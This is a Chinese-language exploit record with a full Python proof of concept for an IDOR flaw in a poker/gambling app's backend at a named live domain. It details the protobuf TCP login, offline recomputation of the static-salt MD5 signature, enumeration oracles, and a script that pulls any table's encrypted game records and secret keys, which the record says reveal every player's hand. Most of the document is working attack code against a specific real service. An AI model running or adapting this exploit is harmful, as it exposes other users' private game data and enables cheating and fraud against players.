# 自研 App 网关 46750 POST /notarialdata 越权读取任意牌局公证密文与 secretkey（tableid/roundid 无归属校验）

- **code**: app-gateway-46750-notarialdata-idor-tableid-roundid
- **kind**: exp
- **category**: unauthorized
- **component**: 自研 App 后端网关（IIS + JSON，POST 根路径，静态盐 private_&lt;route&gt; 签名）
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: task#614，2026-11-05 02:28–02:31 UTC，Windows 执行机 python 3.13 + requests(trust_env=False) 直连，请求间隔 6.2s，全程只读。① 36610：HEARTBEAT 0x1000 回 7B 时间戳原样回显，LOGIN 0x2001 回 userId=643700/state=2，properties key=-99 取到 token（自建、零牌局记录测试账号，口令与 token 已脱敏）。② 阳性对照 POST /notices（盐 private_notices）→ HTTP 200/439B/ret=0，证明该 token 被 46750 接受。③ 目标接口 POST /notarialdata，tableid=1&roundid=1 → HTTP 200/5320B/ret=0，data.tableid="1_1"、notarial 3120 字符、secretkey 2080 字符；同一 token 仅把 roundid 改为 2 → 同样 200/5320B/ret=0 但 notarial md5 不同（735cf5b7cd3db48c vs 6be18292d56e61c4），证明是按局真实数据而非回显/缓存。④ 负控三组：tableid=2、tableid=100 → 200/39B/{"ret":3,"msg":"数据查询失败！"}（id 可按存在性区分）；把 body.userid 换成 485982（token 不变）→ 200/39B/{"ret":2,"msg":"账号认证失败！"}；关闭 36610 TCP 后同一 token 再打 → 同样 ret=2。三态可分辨 → 判定成立：服务端只绑定 token↔userid，不校验 (tableid,roundid) 归属，该自建零牌局账号读到了他局公证密文与密钥。
- **path**: pocs/app-gateway-46750-notarialdata-idor-tableid-roundid/notarialdata_idor.py
- **tags**: 46750,notarialdata,idor,越权,牌局,公证,secretkey,36610,protobuf,裸tcp,verify签名,静态盐,牌局透视,博彩,无归属校验
- **created_at**: 2026-11-04T18:40:35.924Z
- **engine**: https://sjan.o0hyfmi.club:46750（会话前置 https://sjan.o0hyfmi.club:36610）

## 描述

同族 App 网关的 /notarialdata 只校验「token 与 body.userid 属于同一账号」，对 (tableid, roundid) 指向的牌局不做任何归属校验：任意一个持有在线 36610 会话的账号（含零牌局记录的新注册账号）都能按自增 id 取到任意已存在牌局的 notarial 密文与 secretkey。签名 verify 由客户端静态盐 private_notarialdata 离线复算，不构成访问控制；真正的门槛只有「有效会话 token」这一层，且必须保持 36610 TCP 在线。密文+密钥配合客户端 decryptCards 可离线还原整桌手牌，等于牌局透视。

## 用法

```
前置（缺一不可）：
1) 一个有效账号；必须先登录 36610 并**保持 TCP 连接在线**（定时发 0x1000 心跳），关掉 TCP 后同一 token 立刻被判 ret=2「账号认证失败」；
2) 环境变量 ACC/PWD 填账号口令（HOST 默认目标域，TCP_PORT=36610，API=https://HOST:46750）；
3) python requests 必须 trust_env=False（本机环境代理会污染直连）；IP 字面量主机需 --noproxy '*'；单发间隔 ≥6s。

运行：
  set ACC=&lt;账号&gt; &amp; set PWD=&lt;口令&gt;            (cmd)
  export ACC=&lt;账号&gt; PWD=&lt;口令&gt;               (bash)
  python notarialdata_idor.py                  # 默认枚举 tid 1..3 × rid 1..2
  TIDS="1,2,100" RIDS="1,2,3" GAP=6.2 python notarialdata_idor.py

核心三件事：
① verify 离线复算（盐 private_notarialdata，key 升序裸拼 key+value，无分隔符，MD5 大写）：
   signstr = gameid+v + matchid+v + matchtype+v + roundid+v + tableid+v + token+v + type+v + userid+v + version+v + "private_notarialdata"
   例：gameid1matchid1matchtype1roundid1tableid1token&lt;TOKEN&gt;type1userid&lt;UID&gt;version0.0.0.0private_notarialdata
② POST https://&lt;HOST&gt;:46750/notarialdata，body：
   {"version":"0.0.0.0","token":"&lt;在线会话token&gt;","type":1,"userid":&lt;同名账号UID&gt;,
    "tableid":"1","roundid":"1","gameid":"1","matchid":"1","matchtype":"1","verify":"&lt;复算值&gt;"}
③ 三态判据（务必做 A/B，不能只看 200）：
   ret=0 + data.notarial(约3120字符) + data.secretkey(约2080字符)  → 越权读取成立（data.tableid 形如 "1_1"）
   ret=3「数据查询失败！」                                        → 该 (tableid,roundid) 不存在，可据此按存在性枚举
   ret=2「账号认证失败！」                                        → token 与 userid 不同源，或 36610 socket 已掉线
   ret=1「参数检查失败！」                                        → verify 算错 / matchid·matchtype 传空 / 字段缺失

常见失败原因：
- 用另一个 userid（哪怕 token 合法）→ ret=2，这恰证明门禁是「token↔userid 同账号」而非牌局归属；
- 登录后关闭 TCP 再打 HTTP → ret=2，必须靠心跳续会话；
- 把 gameid/matchid/matchtype 当成定位键：实测固定为 1 时只改 tableid/roundid 返回即变化，定位键只有 (tableid,roundid)；
- verify 用了 /notices 的盐或字段集 → ret=1；version 可填 0.0.0.0（服务端只签名不校验版本），但必须与签名串一致。
```

## 正文

```
# 46750 /notarialdata 越权读取牌局公证密文 + secretkey（IDOR）

## 1. 结论与危害

`POST https://<HOST>:46750/notarialdata` 的访问控制只做到「body.token 与 body.userid 属于同一账号」，
**对 (tableid, roundid) 所指向的牌局没有任何归属校验**。任何持有有效在线会话的账号——
包括本次任务内自建、零牌局记录的测试账号（uid=643700）——都能按自增 id 取到任意已存在牌局的
`notarial` 密文与 `secretkey`。

- 同一 token、不同 (tableid, roundid) 返回不同密文（notarial md5 不同），证明是真实逐局数据而非缓存/回显；
- id 空间可按存在性区分：命中 → `ret=0`；不存在 → `ret=3「数据查询失败！」`，可直接枚举；
- 结合客户端已还原的 `decryptCards`（notarial + secretkey 离线解密），可还原整桌手牌 → **牌局透视**。

本条的实质是**水平/对象级越权（IDOR）**：授权层存在，但对象级鉴权缺失。

## 2. 前置条件

1. 一个有效账号（自建即可，无需任何牌局记录）。
2. **必须先登录 36610 裸 TCP 网关并保持连接在线**（定时心跳）。关闭 TCP 后，同一 token 打 46750 立刻回 `ret=2`。
3. 签名可离线复算：盐是客户端字面量 `private_notarialdata`，无需服务端密钥。
4. token 与 userid 必须同源；`matchid`/`matchtype` 不可为空，否则 `ret=1`。

## 3. 第一段：36610 登录拿 token

帧格式（实测，全小端）：

```
16B 头 = rsv u32(0) | type u32 | len i32 | seq i32   + protobuf body
```

- `0x1000` HEARTBEAT：body = `field1 varint(毫秒时间戳)`；应答同 type、body 7B、时间戳原样回显 → 会话可用。
- `0x2001` LOGIN：body 字段

| field | 含义 | 实测值 |
|---|---|---|
| 1 | deviceType | 2 |
| 2 | certType | 10（明文口令） |
| 3 | cert（口令） | &lt;REDACTED&gt; |
| 4 | channel | vip_1 |
| 5 / 8 | account | &lt;ACCOUNT&gt; |
| 9 (repeated) | properties map | {0:"1.0.0.9", 1:"&lt;deviceid&gt;", 4:"&lt;package&gt;"} |
| 10 | through | `%Y-%m-%d %H-%M-%S-0000_1` |

- 应答 `0x2001`：`f2=userId`、`f3=state`、`f9` 内的 map `key=-99` 即 **token**。
- 拿到 token 后必须起心跳线程（约每 10s 一次 `0x1000`），否则 HTTP 段会被判掉线。

## 4. 第二段：签名复算

```
参与签名字段 = gameid, matchid, matchtype, roundid, tableid, token, type, userid, version
signstr = "".join(k + str(v) for k in sorted(keys)) + "private_notarialdata"
verify  = MD5(signstr).hexdigest().upper()      # 32 位大写
```

裸 key 拼裸 value：无 `=`、无 `&`、无分隔符。实测样本串：

```
gameid1matchid1matchtype1roundid1tableid1token<TOKEN>type1userid643700version0.0.0.0private_notarialdata
```

（`version` 可填 `0.0.0.0`，服务端只把它纳入签名、不做版本校验；但填什么就必须按什么算。）

## 5. 第三段：请求与判据

```http
POST /notarialdata HTTP/1.1
Host: <HOST>:46750
Content-Type: application/json;charset=utf-8

{"version":"0.0.0.0","token":"<在线会话token>","type":1,"userid":643700,
 "tableid":"1","roundid":"1","gameid":"1","matchid":"1","matchtype":"1",
 "verify":"<复算值>"}
```

| 响应 | 含义 |
|---|---|
| `200 / 5320B` `{"ret":0,"data":{"tableid":"1_1","roundid":"1","notarial":"<3120字符>","secretkey":"<2080字符>"}}` | 越权读取成立 |
| `200 / 39B` `{"ret":3,"msg":"数据查询失败！"}` | 该 (tableid,roundid) 不存在 → 可做存在性枚举 |
| `200 / 39B` `{"ret":2,"msg":"账号认证失败！"}` | token 与 userid 不同源，或 36610 socket 已掉线 |
| `200 / 39B` `{"ret":1,"msg":"参数检查失败！"}` | verify 错 / matchid·matchtype 为空 / 字段缺失 |

正向验证要点（必须做对照，别只看 200）：

- 同一 token 改 `roundid` 1→2，notarial md5 从 `735cf5b7cd3db48c` 变为 `6be18292d56e61c4` → 数据逐局不同；
- `tableid=2/100` → `ret=3`，`tableid=1` → `ret=0` → id 空间可按存在性枚举；
- 同一 token 换 `userid=485982` → `ret=2` → 门禁确实只绑 token↔userid，与牌局归属无关；
- 关掉 TCP 后再打 → `ret=2` → 会话门槛在位，心跳不可省。

## 6. 复现脚本（python，标准库 + requests）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""notarialdata IDOR read-only PoC.
链路: 36610 裸 TCP(protobuf) 登录 -> token(保持 socket 在线) -> POST 46750 /notarialdata
用法: set ACC=<账号> & set PWD=<口令>  /  export ACC=.. PWD=..
      python notarialdata_idor.py   可选 TIDS=1,2,3 RIDS=1,2 GAP=6.2
只读操作, 请遵守授权范围与速率(默认 6.2s/请求)。
"""
import socket, struct, threading, time, hashlib, json, os
import requests, urllib3

urllib3.disable_warnings()

HOST = os.environ.get("HOST", "sjan.o0hyfmi.club")
TCP_PORT = int(os.environ.get("TCP_PORT", "36610"))
API = os.environ.get("API", "https://%s:46750" % HOST)
ACC = os.environ["ACC"]
PWD = os.environ["PWD"]
CHANNEL = os.environ.get("CHANNEL", "vip_1")
DEVICEID = os.environ.get("DEVICEID", "de13cf79b11b21d5")
PKG = os.environ.get("PKG", "com.pksj.poker")
VERSION = "0.0.0.0"
GAP = float(os.environ.get("GAP", "6.2"))
TIDS = [x for x in os.environ.get("TIDS", "1,2,3").split(",") if x]
RIDS = [x for x in os.environ.get("RIDS", "1,2").split(",") if x]
UA = os.environ.get("ARTEX_UA") or ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
     "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36")


def varint(n):
    if n < 0:
        n = (1 << 64) + n
    out = b""
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out += bytes([b | 0x80])
        else:
            return out + bytes([b])


def fv(num, v):
    return bytes([(num << 3) | 0]) + varint(v)


def fs(num, s):
    b = s.encode() if isinstance(s, str) else s
    return bytes([(num << 3) | 2]) + varint(len(b)) + b


def kv(k, v):
    return fv(1, k) + fs(3, v)


def through_now():
    return time.strftime("%Y-%m-%d %H-%M-%S") + "-0000_1"


def parse_msg(b):
    out, i = [], 0
    while i < len(b):
        k = sh = 0
        while True:
            c = b[i]; i += 1
            k |= (c & 0x7F) << sh; sh += 7
            if not (c & 0x80):
                break
        fn, wt = k >> 3, k & 7
        if wt == 0:
            v = sh = 0
            while True:
                c = b[i]; i += 1
                v |= (c & 0x7F) << sh; sh += 7
                if not (c & 0x80):
                    break
            if v >= (1 << 63):
                v -= (1 << 64)
            out.append({"f": fn, "wt": 0, "val": v})
        elif wt == 2:
            ln = sh = 0
            while True:
                c = b[i]; i += 1
                ln |= (c & 0x7F) << sh; sh += 7
                if not (c & 0x80):
                    break
            raw = b[i:i + ln]; i += ln
            try:
                s = raw.decode("utf-8")
            except Exception:
                s = None
            out.append({"f": fn, "wt": 2, "hex": raw.hex(), "s": s})
        elif wt == 5:
            out.append({"f": fn, "wt": 5, "hex": b[i:i + 4].hex()}); i += 4
        elif wt == 1:
            out.append({"f": fn, "wt": 1, "hex": b[i:i + 8].hex()}); i += 8
        else:
            break
    return out


class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, TCP_PORT), timeout=20)
        self.s.settimeout(20)
        self.lock = threading.Lock()

    def send(self, mtype, body):
        # 16B 头: rsv u32 | type u32 | len i32 | seq i32 —— 全小端
        self.s.sendall(struct.pack("<I", 0) + struct.pack("<I", mtype) +
                       struct.pack("<i", len(body)) + struct.pack("<i", 1) + body)

    def recv(self):
        h = b""
        while len(h) < 16:
            c = self.s.recv(16 - len(h))
            if not c:
                raise EOFError("header eof")
            h += c
        _rsv, rt, bl, _sq = struct.unpack("<IIii", h)
        bd = b""
        while len(bd) < bl:
            c = self.s.recv(bl - len(bd))
            if not c:
                raise EOFError("body eof")
            bd += c
        return rt, bd


def login(conn):
    ts = int(time.time() * 1000)
    conn.send(0x1000, fv(1, ts))
    rt, _bd = conn.recv()
    if rt != 0x1000:
        raise RuntimeError("heartbeat 未回 0x1000, rt=0x%X" % rt)
    body = (fv(1, 2) + fv(2, 10) + fs(3, PWD) + fs(4, CHANNEL) +
            fs(5, ACC) + fs(8, ACC) +
            fs(9, kv(0, "1.0.0.9")) + fs(9, kv(1, DEVICEID)) + fs(9, kv(4, PKG)) +
            fs(10, through_now()))
    conn.send(0x2001, body)
    rt, bd = conn.recv()
    uid = state = token = None
    for it in parse_msg(bd):
        if it["f"] == 2 and it["wt"] == 0:
            uid = it["val"]
        if it["f"] == 3 and it["wt"] == 0:
            state = it["val"]
        if it["f"] == 9 and it["wt"] == 2:
            d = {}
            for x in parse_msg(bytes.fromhex(it["hex"])):
                d[x["f"]] = x["val"] if x["wt"] == 0 else x.get("s")
            if d.get(1) == -99:
                token = d.get(3)
    if not token:
        raise RuntimeError("登录未取到 token: uid=%r state=%r" % (uid, state))
    print("[+] login ok uid=%s state=%s token=%s..." % (uid, state, token[:8]))
    return uid, token


def keepalive(conn, stop):
    while not stop.wait(10.0):
        try:
            with conn.lock:
                conn.send(0x1000, fv(1, int(time.time() * 1000)))
                conn.recv()
            print("[*] heartbeat ok (socket 保持在线)")
        except Exception as e:
            print("[-] heartbeat 失败: %r" % (e,))
            return


S = requests.Session()
S.trust_env = False          # 关闭环境代理, 必须


def sign(fields, salt):
    signstr = "".join("%s%s" % (k, fields[k]) for k in sorted(fields)) + salt
    return hashlib.md5(signstr.encode()).hexdigest().upper(), signstr


def post(route, salt, fields, gap=GAP):
    d = dict(fields)
    v, _ = sign(d, salt)
    body = dict(d, verify=v)
    hdr = {"Content-Type": "application/json;charset=utf-8", "User-Agent": UA,
           "Accept": "application/json, text/plain, */*"}
    r = S.post(API + route, json=body, headers=hdr, timeout=45, verify=False)
    try:
        j = r.json()
    except Exception:
        j = None
    print("[>] %s verify=%s len=%d ret=%r" % (route, v, len(r.content), (j or {}).get("ret")))
    time.sleep(gap)
    return r, j


def notarialdata(token, uid, tid, rid, gameid="1", matchid="1", matchtype="1"):
    """定位键只有 (tableid, roundid); gameid/matchid/matchtype 只参与签名"""
    return post("/notarialdata", "private_notarialdata", {
        "version": VERSION, "token": token, "type": 1, "userid": uid,
        "tableid": str(tid), "roundid": str(rid),
        "gameid": str(gameid), "matchid": str(matchid), "matchtype": str(matchtype)})


def main():
    conn = Conn()
    uid, token = login(conn)
    stop = threading.Event()
    threading.Thread(target=keepalive, args=(conn, stop), daemon=True).start()
    time.sleep(0.5)

    hits = []
    for tid in TIDS:
        for rid in RIDS:
            _r, j = notarialdata(token, uid, tid, rid)
            ret = (j or {}).get("ret")
            if ret == 0:
                data = j.get("data") or {}
                n, k = data.get("notarial") or "", data.get("secretkey") or ""
                print("    [+] 命中 tableid=%s roundid=%s field=%s notarial=%d字符 md5=%s "
                      "secretkey=%d字符" % (tid, rid, data.get("tableid"), len(n),
                      hashlib.md5(n.encode()).hexdigest()[:16], len(k)))
                hits.append({"tableid": tid, "roundid": rid,
                             "tableid_field": data.get("tableid"),
                             "notarial_len": len(n), "secretkey_len": len(k),
                             "notarial_md5_16": hashlib.md5(n.encode()).hexdigest()[:16]})
            elif ret == 3:
                print("    [-] tableid=%s roundid=%s 记录不存在(ret=3)" % (tid, rid))
            elif ret == 2:
                print("    [!] ret=2: token 与 userid 不同源, 或 36610 socket 已掉线")
            elif ret == 1:
                print("    [!] ret=1: verify 错 / matchid·matchtype 为空")
    print("\n[=] 命中 %d 条" % len(hits))
    print(json.dumps(hits, ensure_ascii=False, indent=1))
    stop.set()
    conn.s.close()


if __name__ == "__main__":
    main()
```

## 7. 拿到数据之后

`data.notarial` 是按局加密的公证串，`data.secretkey` 是配套密钥串；客户端 `decryptCards`
可直接用两者离线还原该局全部手牌（客户端逆向结论，本条只负责数据获取链路）。
共享账号 / 任意新注册账号 + 本接口 = 对全站历史牌局的"事后透视"，故定 critical。

## 8. 证伪条件

- 换 `userid` 仍返回 `ret=0` 且数据不同 → 说明连 token↔userid 绑定都没有，结论要改写（更严重）；
- 只改 `roundid`/`tableid` 时返回体逐字节相同 → 数据未按局变化，可能不是真实牌局数据，结论不成立；
- 不使用会话 token（随机 32hex）也能得到 `ret=0` → 则不只是 IDOR，而是完全未授权，需重新定级；
- 上述任一情形都与本次实测不符：本次 `ret=2`（换 userid）/`ret=3`（不存在的 id）/`ret=0`（真实 id）三态清晰可分辨。

```
